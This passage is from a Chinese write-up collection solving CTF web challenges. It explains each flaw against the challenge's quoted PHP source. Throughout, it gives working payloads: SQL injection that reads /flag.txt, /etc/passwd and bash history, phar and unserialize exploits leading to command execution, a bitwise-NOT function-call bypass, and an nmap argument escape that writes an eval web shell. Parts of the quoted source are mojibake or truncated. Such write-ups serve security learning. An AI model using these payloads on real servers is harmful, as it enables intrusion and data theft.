失败原因是这里对nickname有长度限制，直接用数组绕过其次这里还有个坑，如果你传入的是nickname[],他的反序列化不是这样 a:4:{s:5:&quot;phone&quot;;s:6:&quot;123123&quot;;s:5:&quot;email&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;s:3:&quot;aaa&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;}而是这样的 a:4:{s:5:&quot;phone&quot;;s:6:&quot;123123&quot;;s:5:&quot;email&quot;;s:3:&quot;123&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:3:&quot;aaa&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;}所以终版构造的photo是这样的 &quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}一共是三十四个字符。由于代码对username的检测，每多一个where被替换为hacker，就多一个字符的位置，为了替换后构造的photo能成功的被挤出去，也就需要三十四个where。综上，payload为 wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}如图传入再访问profile.php,在源代码得到flag。 [CISCN2019 华北赛区 Day1 Web5]CyberPunk考点：php伪协议、报错注入 结合实事，来一道2077。 首页是个提交订单的页面，表单中提交姓名、电话、地址三个参数。下面还有几个订单管理的功能。 查看源码发现提示 那就先试试用伪协议把源码读一读 payload: ?file=php://filter/read=convert.base64-encode/resource=xxx.php#change.php &lt;?php require_once \"config.php\"; if(!empty($_POST[\"user_name\"]) &amp;&amp; !empty($_POST[\"address\"]) &amp;&amp; !empty($_POST[\"phone\"])) { $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $address = addslashes($_POST[\"address\"]); $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\"; $fetch = $db->query($sql); } if (isset($fetch) &amp;&amp; $fetch->num_rows>0){ $row = $fetch->fetch_assoc(); $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id']; $result = $db->query($sql); if(!$result) { echo 'error'; print_r($db->error); exit; } $msg = \"订单修改成功\"; } else { $msg = \"未找到订单!\"; } }else { $msg = \"信息不全\"; } ?> #confirm.php &lt;?php require_once \"config.php\"; //var_dump($_POST); if(!empty($_POST[\"user_name\"]) &amp;&amp; !empty($_POST[\"address\"]) &amp;&amp; !empty($_POST[\"phone\"])) { $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $address = $_POST[\"address\"]; $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\"; $fetch = $db->query($sql); } if($fetch->num_rows>0) { $msg = $user_name.\"已提交订单\"; }else{ $sql = \"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\"; $re = $db->prepare($sql); $re->bind_param(\"sss\", $user_name, $address, $phone); $re = $re->execute(); if(!$re) { echo 'error'; print_r($db->error); exit; } $msg = \"订单提交成功\"; } } else { $msg = \"信息不全\"; } ?> #delete.php &lt;?php require_once \"config.php\"; if(!empty($_POST[\"user_name\"]) &amp;&amp; !empty($_POST[\"phone\"])) { $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\"; $fetch = $db->query($sql); } if (isset($fetch) &amp;&amp; $fetch->num_rows>0){ $row = $fetch->fetch_assoc(); $result = $db->query('delete from `user` where `user_id`=' . $row[\"user_id\"]); if(!$result) { echo 'error'; print_r($db->error); exit; } $msg = \"订单删除成功\"; } else { $msg = \"未找到订单!\"; } }else { $msg = \"信息不全\"; } ?> #index.php &lt;?php ini_set('open_basedir', '/var/www/html/'); // $file = $_GET[\"file\"]; $file = (isset($_GET['file']) ? $_GET['file'] : null); if (isset($file)){ if (preg_match(\"/phar|zip|bzip2|zlib|data|input|%00/i\",$file)) { echo('no way!'); exit; } @include($file); } ?> #search.php &lt;?php require_once \"config.php\"; if(!empty($_POST[\"user_name\"]) &amp;&amp; !empty($_POST[\"phone\"])) { $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\"; $fetch = $db->query($sql); } if (isset($fetch) &amp;&amp; $fetch->num_rows>0){ $row = $fetch->fetch_assoc(); if(!$row) { echo 'error'; print_r($db->error); exit; } $msg = \"&lt;p>姓名:\".$row['user_name'].\"&lt;/p>&lt;p>, 电话:\".$row['phone'].\"&lt;/p>&lt;p>, 地址:\".$row['address'].\"&lt;/p>\"; } else { $msg = \"未找到订单!\"; } }else { $msg = \"信息不全\"; } ?> 重点关注change.php。 这个过滤只是看起来很严谨，但实际上他只对user_name和phone做了过滤，而参数address却被放过了，只对它进行了转义。 $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $address = addslashes($_POST[\"address\"]); $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; ... 再向下看代码： 这一部分原本意图是更改地址，但却把旧地址作为old_address重新存入了数据库中，而且再次进行了查询。 也就是说，如果先提交一个有单引号之类字符的payload，再用随便一个数据把它顶替成old_address，那么payload就不会被addslashes函数限制，并且作为old_address被成功触发。 //change.php if (isset($fetch) &amp;&amp; $fetch->num_rows>0){ $row = $fetch->fetch_assoc(); $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id']; $result = $db->query($sql); if(!$result) { echo 'error'; print_r($db->error); exit; } 结合报错注入，payload如下： 1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,50)),0x7e),1)#结果load_file就显示了后半截。 再读下前面的 1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)# [ASIS 2019]Unicorn shop考点：unicode转换安全 这个点确实没细看过。这次整理一下。 简单来看，Unicode的安全问题分为 视觉欺骗：视觉问题一般指几个不同的不同的字符在某个字体下看起来较为相同。可能是字符之间一对一相似、多个字符的组合字符和一个字符相似等。 具体分类参考： 非视觉漏洞：这些问题主要字符是转换导致的字符串。 这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。举例来说，a 和ａ(\\uff41)在某些字体下看起来可能相同，15和⑮(\\u246e)其表示的数学意义可能相同， 参考： 回到题目，是个独角兽商店。看这意思就是想让你把最贵那个买下来。 可以看见输入1337后它提示只允许输入一个字符。 那么在网站https://www.compart.com/en/unicode/里找到一个值大于1337的字符就可以了。我选择了下面这个字符。 输入后得到flag。 [网鼎杯 2018]Comment考点：二次注入 进去是个留言板。想随便提交点东西进去结果要你先登录。 看这意思那就先爆破一下密码：zhangwei666 顺便扫了一下，诶，git泄露。 结果就这一个文件，看起来也没啥用。 &lt;?php include \"mysql.php\"; session_start(); if($_SESSION['login'] != 'yes'){ header(\"Location: ./login.php\"); die(); } if(isset($_GET['do'])){ switch ($_GET['do']) { case 'write': break; case 'comment': break; default: header(\"Location: ./index.php\"); } } else{ header(\"Location: ./index.php\"); } ?> 控制台这看到 又回githack恢复 &lt;?php include \"mysql.php\"; session_start(); if($_SESSION['login'] != 'yes'){ header(\"Location: ./login.php\"); die(); } if(isset($_GET['do'])){ switch ($_GET['do']) { case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = \"insert into board set category = '$category', title = '$title', content = '$content'\"; $result = mysql_query($sql); header(\"Location: ./index.php\"); break; case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = \"select category from board where id='$bo_id'\"; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num>0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = \"insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'\"; $result = mysql_query($sql); } header(\"Location: ./comment.php?id=$bo_id\"); break; default: header(\"Location: ./index.php\"); } } else{ header(\"Location: ./index.php\"); } ?> 大概率二次注入，参数除了有转义以外没有其他过滤。 可以看到两个case里都存在$category这个参数，write里的是用户post传入，而comment里的是从数据库取出来的。 case write: $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = \"insert into board set category = '$category', title = '$title', content = '$content'\"; case comment: $sql = \"select category from board where id='$bo_id'\"; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num>0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = \"insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'\"; $result = mysql_query($sql); } 尽管write中插入数据时做了转义，但实际上存入数据库里的数据是并没有被转义的。因此write时存入一个$category，如 ',content=user()，/* 同时comment中存入一个$content,如 */# 当comment执行insert语句时就会造成二次注入。 insert into comment set category = ' ',content=user()，/*', content = '*/#', bo_id = '$bo_id'\"; 综上，就可以构造语句找flag文件了。 （找文件的思路还要再学学 o.o etc/passwd ',content=(select(load_file(\"/etc/passwd\"))),/* 看到www用了bash登录，查看bash_history ',content=(select(load_file(\"/home/www/.bash_history\"))),/* 删除了.DS_Store,那大概就是要找到他了。(hex显示完整文件)，解出来得到flag_8946e1ff1ee3e40f.php ',content=(select hex(load_file(\"/tmp/html/.DS_Store\"))),/* ',content=(select hex(load_file(\"/tmp/html/flag_8946e1ff1ee3e40f.php\"))),/* 得到flag,但是不对，啊这.. 想起来还有一个/var下的,得到正确flag。 ',content=(select hex(load_file(\"/var/www/html/flag_8946e1ff1ee3e40f.php\"))),/* CISCN-2019-华北赛区-Day1-Web-Web1首先是个登录注册界面，不考虑其他的先随便注册一个登进去看看。 进入之后是一个上传文件，简单传了几个文件发现并没有做很严格的限制；除此之外上传的文件还有下载和删除功能；上传、下载、删除都分别抓了下包，发现在下载界面的download.php这里存在任意文件读取，依次读取以下源码： //index.php &lt;?php include \"class.php\"; $a = new FileList($_SESSION['sandbox']); $a->Name(); $a->Size(); ?> //class.php &lt;?php error_reporting(0); $dbaddr = \"127.0.0.1\"; $dbuser = \"root\"; $dbpass = \"root\"; $dbname = \"dropbox\"; $db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User { public $db; public function __construct() { global $db; $this->db = $db; } public function user_exist($username) { $stmt = $this->db->prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\"); $stmt->bind_param(\"s\", $username); $stmt->execute(); $stmt->store_result(); $count = $stmt->num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this->user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this->db->prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\"); $stmt->bind_param(\"ss\", $username, $password); $stmt->execute(); return true; } public function verify_user($username, $password) { if (!$this->user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this->db->prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\"); $stmt->bind_param(\"s\", $username); $stmt->execute(); $stmt->bind_result($expect); $stmt->fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this->db->close(); } } class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this->files = array(); $this->results = array(); $this->funcs = array(); $filenames = scandir($path); $key = array_search(\".\", $filenames); unset($filenames[$key]); $key = array_search(\"..\", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file->open($path . $filename); array_push($this->files, $file); $this->results[$file->name()] = array(); } } public function __call($func, $args) { array_push($this->funcs, $func); foreach ($this->files as $file) { $this->results[$file->name()][$func] = $file->$func(); } } public function __destruct() { $table = '&lt;div id=\"container\" class=\"container\">&lt;div class=\"table-responsive\">&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\">'; $table .= '&lt;thead>&lt;tr>'; foreach ($this->funcs as $func) { $table .= '&lt;th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '&lt;/th>'; } $table .= '&lt;th scope=\"col\" class=\"text-center\">Opt&lt;/th>'; $table .= '&lt;/thead>&lt;tbody>'; foreach ($this->results as $filename => $result) { $table .= '&lt;tr>'; foreach ($result as $func => $value) { $table .= '&lt;td class=\"text-center\">' . htmlentities($value) . '&lt;/td>'; } $table .= '&lt;td class=\"text-center\" filename=\"' . htmlentities($filename) . '\">&lt;a href=\"#\" class=\"download\">涓嬭浇&lt;/a> / &lt;a href=\"#\" class=\"delete\">鍒犻櫎&lt;/a>&lt;/td>'; $table .= '&lt;/tr>'; } echo $table; } } class File { public $filename; public function open($filename) { $this->filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this->filename); } public function size() { $size = filesize($this->filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size >= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this->filename); } public function close() { return file_get_contents($this->filename); } } ?> //delete.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die(); } if (!isset($_POST['filename'])) { die(); } include \"class.php\"; chdir($_SESSION['sandbox']); $file = new File(); $filename = (string) $_POST['filename']; if (strlen($filename) &lt; 40 &amp;&amp; $file->open($filename)) { $file->detele(); Header(\"Content-type: application/json\"); $response = array(\"success\" => true, \"error\" => \"\"); echo json_encode($response); } else { Header(\"Content-type: application/json\"); $response = array(\"success\" => false, \"error\" => \"File not exist\"); echo json_encode($response); } ?> //download.php &lt;?php session_start(); if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die(); } if (!isset($_POST['filename'])) { die(); } include \"class.php\"; ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\"); chdir($_SESSION['sandbox']); $file = new File(); $filename = (string) $_POST['filename']; if (strlen($filename) &lt; 40 &amp;&amp; $file->open($filename) &amp;&amp; stristr($filename, \"flag\") === false) { Header(\"Content-type: application/octet-stream\"); Header(\"Content-Disposition: attachment; filename=\" . basename($filename)); echo $file->close(); } else { echo \"File not exist\"; } ?> //login.php &lt;?php session_start(); if (isset($_SESSION['login'])) { header(\"Location: index.php\"); die(); } ?> &lt;!doctype html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"> &lt;meta name=\"description\" content=\"\"> &lt;title>鐧诲綍&lt;/title> &lt;!-- Bootstrap core CSS --> &lt;link href=\"static/css/bootstrap.min.css\" rel=\"stylesheet\"> &lt;style> .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; } @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } } &lt;/style> &lt;!-- Custom styles for this template --> &lt;link href=\"static/css/std.css\" rel=\"stylesheet\"> &lt;/head> &lt;body class=\"text-center\"> &lt;form class=\"form-signin\" action=\"login.php\" method=\"POST\"> &lt;h1 class=\"h3 mb-3 font-weight-normal\">鐧诲綍&lt;/h1> &lt;label for=\"username\" class=\"sr-only\">Username&lt;/label> &lt;input type=\"text\" name=\"username\" class=\"form-control\" placeholder=\"Username\" required autofocus> &lt;label for=\"password\" class=\"sr-only\">Password&lt;/label> &lt;input type=\"password\" name=\"password\" class=\"form-control\" placeholder=\"Password\" required> &lt;button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">鎻愪氦&lt;/button> &lt;p class=\"mt-5 text-muted\">杩樻病鏈夎处鍙�? &lt;a href=\"register.php\">娉ㄥ唽&lt;/a>&lt;/p> &lt;p class=\"text-muted\">&amp;copy; 2018-2019&lt;/p> &lt;/form> &lt;div class=\"top\" id=\"toast-container\">&lt;/div> &lt;/body> &lt;script src=\"static/js/jquery.min.js\">&lt;/script> &lt;script src=\"static/js/bootstrap.bundle.min.js\">&lt;/script> &lt;script src=\"static/js/toast.js\">&lt;/script> &lt;/html> &lt;?php include \"class.php\"; if (isset($_GET['register'])) { echo \"&lt;script>toast('娉ㄥ唽鎴愬姛', 'info');&lt;/script>\"; } if (isset($_POST[\"username\"]) &amp;&amp; isset($_POST[\"password\"])) { $u = new User(); $username = (string) $_POST[\"username\"]; $password = (string) $_POST[\"password\"]; if (strlen($username) &lt; 20 &amp;&amp; $u->verify_user($username, $password)) { $_SESSION['login'] = true; $_SESSION['username'] = htmlentities($username); $sandbox = \"uploads/\" . sha1($_SESSION['username'] . \"sftUahRiTz\") . \"/\"; if (!is_dir($sandbox)) { mkdir($sandbox); } $_SESSION['sandbox'] = $sandbox; echo(\"&lt;script>window.location.href='index.php';&lt;/script>\"); die(); } echo \"&lt;script>toast('璐﹀彿鎴栧瘑鐮侀敊璇�', 'warning');&lt;/script>\"; } ?> 其中发现class.php的File类中的close()内存在file_get_contents()可能读取文件。 继续向上跟踪，看见User类中调用了一个close()。那么如果db变量是File对象，再传下$filename，就可以直接调用File中的close()进行文件读取。但这样并没有可输出数据的地方。 曲线救国，看到了FileList类。 首先FileList对象中存在__call方法，当我们调用不存在的方法时会自动调用它。 本题中__call方法的作用就是遍历所有文件去调用刚刚的方法，并将结果存储在以filename为一级键名，方法为二级键名的数组result中。 而在销毁时会输出变量$table，$table中存在$results参数。 综上所述。构造思路为： 构建 一个User对象，使它的$db为FileList对象。在User类析构时，因为调用不到close()，就会执行__call方法既而实现执行File类内的close()。这个结果会存入result并被加入table输出。 之后再利用phar伪协议进行利用。这个执行选在delete.php，是因为download.php多了下面这行代码： ini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\"); 它限制了只可以访问当前目录(getcwd()返回当前目录)、/etc和/tmp三个目录。 exp: &lt;?php class User{ public $db; } class File{ public $filename; } class FileList{ private $files; public function __construct() { $file = new File(); $file->filename = \"/flag.txt\"; $this->files = array($file); } } $a = new User(); $a -> db = new FileList(); $phar = new Phar(\"test.phar\"); $phar -> startBuffering(); $phar->setStub(\"&lt;?php __HALT_COMPILER(); ?>\"); $phar -> setMetadata($a); $phar -> addFromString(\"exp.txt\",\"test\"); $phar -> stopBuffering(); ?> 剩下的流程就是抓包传test.phar，改个Content-Type成png，上传成功；之后在delete页面filename传参phar://test.png得到flag。 2020-第五空间智能安全大赛-Web-hate-php 可以看见先是用preg_match对参数code做了很多过滤， 后面又用到 $blacklist = get_defined_functions()[&#39;internal&#39;];把内置函数加到黑名单里了。 抓了个包看到PHP/7.4.5，php7后可以用 ($a)(); 这种方式执行动态函数。 如 echo urlencode(~'phphinfo'); //输出 %8F%97%8F%96%91%99%90 payload：?code = (~%8F%97%8F%96%91%99%90)() 就能读到phpinfo。 结合取反构造exp: &lt;?php echo urlencode(~'print_r'); echo urlencode(~'scandir'); echo urlencode(~'.'); //payload: ?code=(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((~%D1))) echo urlencode(~'system'); echo urlencode(~'cat flag.php'); //输出 //payload: ??code=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F) 强网杯-2019-Web-高明的黑客题目一上来给了网站的/src源码，三千多个文件； 文件中有很多可利用函数，但需要寻找能正常传参的文件及参数。 #整体思路：先一次性发起请求测试哪些文件的GET和POST的传参是可用的，再在这基础上区分是POST还是GET。这样的思路加多线程可以很好的节约时间。 参考：https://blog.csdn.net/a3320315/article/details/102945940 具体脚本如下： import os import requests import re import threading import time print('开始： '+ time.asctime( time.localtime(time.time()) )) s1=threading.Semaphore(100) filePath = r\"D:\\phpstudy_pro\\WWW\\src\" os.chdir(filePath) #改变当前的路径 requests.adapters.DEFAULT_RETRIES = 10 #设置重连次数 files = os.listdir(filePath) #返回path内全部文件及目录名的数组 session = requests.Session() session.keep_alive = False def get_content(file): s1.acquire() print('trying '+file+ ' '+ time.asctime( time.localtime(time.time()) )) with open(file,encoding='utf-8') as f: #提取所有的$_GET和$_POST的参数 gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read())) posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read())) data = {} #POST params = {} #GET for m in gets: params[m] = 'echo(\"dwm2\");' for n in posts: data[n] = 'echo(\"dwm2\");' url = 'http://127.0.0.1/src/'+file req = session.post(url, data=data, params=params) #一次性请求所有的GET和POST的方法 req.close() content = req.text req.encoding = 'utf-8' #print(content) if \"dwm2\" in content: flag = 0 for a in gets: req = session.get(url+'?%s='%a+'echo(\"dwm2\");') content = req.text req.close() if \"dwm2\" in content: flag = 1 break if flag != 1: for b in posts: req = session.post(url, data={b:'echo(\"dwm2\");'}) content = req.text req.close() if \"dwm2\" in content: break if flag == 1: #flag用来判断参数是GET还是POST param = \"get-\"+a else: param = \"post-\"+b end = \"文件：\"+file+\"参数：\"+param print('结束时间： ' + time.asctime(time.localtime(time.time()))) print(end) s1.release() for i in files: #多线程 t = threading.Thread(target=get_content, args=(i,)) t.start() 跑完得到结果 直接传参得到flag。 2020-数字中国创新大赛虎符网络安全赛道-Web-babyupload 考点：session,代码审计 直接给了源码 &lt;?php error_reporting(0); session_save_path(\"/var/babyctf/\"); session_start(); require_once \"/flag\"; highlight_file(__FILE__); if($_SESSION['username'] ==='admin') { $filename='/var/babyctf/success.txt'; if(file_exists($filename)){ safe_delete($filename); die($flag); } } else{ $_SESSION['username'] ='guest'; } $direction = filter_input(INPUT_POST, 'direction'); $attr = filter_input(INPUT_POST, 'attr'); $dir_path = \"/var/babyctf/\".$attr; //文件夹路径 if($attr===\"private\"){ $dir_path .= \"/\".$_SESSION['username'];//路径为/var/babyctf/private/username } if($direction === \"upload\"){ try{ if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){ //判断文件是否是通过 HTTP POST 上传的 throw new RuntimeException('invalid upload'); } $file_path = $dir_path.\"/\".$_FILES['up_file']['name'];//为/var/babyctf/attr/filename $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']); //为/var/babyctf/attr/filename_sha256(tmp_name) if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){ $upload_result = \"uploaded\"; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $upload_result = $e->getMessage(); } } elseif ($direction === \"download\") { try{ $filename = basename(filter_input(INPUT_POST, 'filename')); $file_path = $dir_path.\"/\".$filename; if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } if(!file_exists($file_path)) { throw new RuntimeException('file not exist'); } header('Content-Type: application/force-download'); header('Content-Length: '.filesize($file_path)); header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"'); if(readfile($file_path)){ $download_result = \"downloaded\"; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $download_result = $e->getMessage(); } exit; } ?> 分析代码，得到flag的条件为session的username为admin且success,txt存在。 而且检测success.txt的file_exists()函数的特点意味着我们建立一个同名文件夹也可以满足条件。 三个传参，direction控制文件上传和下载；attr为新建文件夹名；filename为读取的文件名。 先抓个包看一下session以及它文件中的内容： 这个格式的序列化是php_binary引擎。 综上，大概思路就是：上传一个伪装成admin的session文件，再创建一个名为sucess,txt的文件夹即可满足条件。 重点代码 $file_path = $dir_path.\"/\".$_FILES['up_file']['name']; //为/var/babyctf/attr/filename $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']); //为/var/babyctf/attr/filename_sha256(tmp_name) 也就是说，我们这里让伪造成admin的session文件命名为sess进行上传。 然后用脚本求出hash,并改动PHPSESSID就可以达成第一个条件。 432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4 用postman进行上传 验证一下，已经传上去了 现在再给attr传success.txt创建文件夹； bp这边改下session，得到flag。 2020-网鼎杯-朱雀组-Web-nmap 考点：参数逃逸，nmap使用 打开就是nmap扫描，查看源码发现提示 /flag nmap这类题会想到的两个函数： string escapeshellarg ( string $arg ) string escapeshellcmd ( string $command)escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数 转义字符串$arg中的单引号并使用单引号包裹此部分 使得$arg只能传递一个参数，且不能执行不同的命令； escapeshellcmd — shell 元字符转义 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 转义&amp; # ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ 、x0A和xF，’和”仅在落单时被转义 使得$command只能执行一个命令，但可以传递多个参数； 然而这两个函数一起出现就会存在问题（arg先，cmd后），如图，文本被分为三个部分： 简化后为：12\\ 3&#39; 综上可以构造payload: 127.0.0.1&#39; -iL /flag -oN aaa.txt &#39;本地测试如下： 访问aaa.txt，得到flag。这里也可以看到最后执行的命令。 网上的其他做法是传马； payload &#39; &lt;?= @eval($_POST[&quot;pd&quot;]);?&gt; -oG pd.phtml &#39; 2020-网鼎杯-朱雀组-Web-phpweb主页东西很少，页面定时提交表单刷新。 抓个包看一下,应该是执行的函数和他的传参 用eval执行phpinfo被拦住了，需要绕过waf。 先读一下index.php phpweb body { background: url(\"bg.jpg\") no-repeat; background-size: 100%; } p { color: white; } setTimeout(\"document.form1.submit()\",5000) func != \"\") { echo gettime($this->func, $this->p); } } } $func = $_REQUEST[\"func\"]; $p = $_REQUEST[\"p\"]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\"Hacker...\"); } } ?> 能禁的基本都禁了。 但这个gettime方法里有call_user_func函数，再加上本身有个Test类，那就可以用反序列化了。 &lt;?php class Test { var $p = &quot;ls&quot;; var $func = &quot;system&quot;; } $a=new Test(); echo serialize($a); ?&gt;payload如下，可以看到执行成功； func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} 相似的，查看根目录再读取flag。 payload: func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:20:&quot;cat /flag_2911028111&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} ByteCTF-2019-Web-ezcms考点：md5拓展攻击，phar反序列化 进来是个登录界面 随便输下账户密码进入文件上传界面 点这个view detail是下面这种界面，返回上传的文件类型和文件位置。 随便上传一个文件，出现下面的回显。也就是说上传要求admin权限。 先扫一下，扫出了www.zip。代码审计。 index.php是刚刚的登录页面，它要求传入的password不能等于”admin”。 //index.php &lt;?php error_reporting(0); include('config.php'); if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])){ $username = $_POST['username']; $password = $_POST['password']; $username = urldecode($username); $password = urldecode($password); if ($password === \"admin\"){ die(\"u r not admin !!!\"); } $_SESSION['username'] = $username; $_SESSION['password'] = $password; if (login()){ echo '&lt;script>location.href=\"upload.php\";&lt;/script>'; } } 看下config.php相关登录的部分,可以用md5拓展攻击满足条件。 //config.php function login(){ $secret = \"********\"; setcookie(\"hash\", md5($secret.\"adminadmin\")); return 1; } function is_admin(){ $secret = \"********\"; $username = $_SESSION['username']; $password = $_SESSION['password']; if ($username == \"admin\" &amp;&amp; $password != \"admin\"){ if ($_COOKIE['user'] === md5($secret.$username.$password)){ return 1; } } return 0; } class Profile{ public $username; public $password; public $admin; public function is_admin(){ $this->username = $_SESSION['username']; $this->password = $_SESSION['password']; $secret = \"********\"; if ($this->username === \"admin\" &amp;&amp; $this->password != \"admin\"){ if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){ return 1; } } return 0; } function __call($name, $arguments) { $this->admin->open($this->username, $this->password); } } class Admin{ public $size; public $checker; public $file_tmp; public $filename; public $upload_dir; public $content_check; function __construct($filename, $file_tmp, $size) { $this->upload_dir = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']); if (!file_exists($this->upload_dir)){ mkdir($this->upload_dir, 0777, true); } if (!is_file($this->upload_dir.'/.htaccess')){ file_put_contents($this->upload_dir.'/.htaccess', 'lolololol, i control all'); } $this->size = $size; $this->filename = $filename; $this->file_tmp = $file_tmp; $this->content_check = new Check($this->file_tmp); $profile = new Profile(); $this->checker = $profile->is_admin();//将是否为admin的结果存入$checker } public function upload_file(){ if (!$this->checker){ die('u r not admin'); } $this->content_check -> check(); $tmp = explode(\".\", $this->filename); $ext = end($tmp); if ($this->size > 204800){ die(\"your file is too big\"); } move_uploaded_file($this->file_tmp, $this->upload_dir.'/'.md5($this->filename).'.'.$ext); } public function __call($name, $arguments) { } } //用hashpump构造payload 向用户名传admin,密码传这个进行登录。 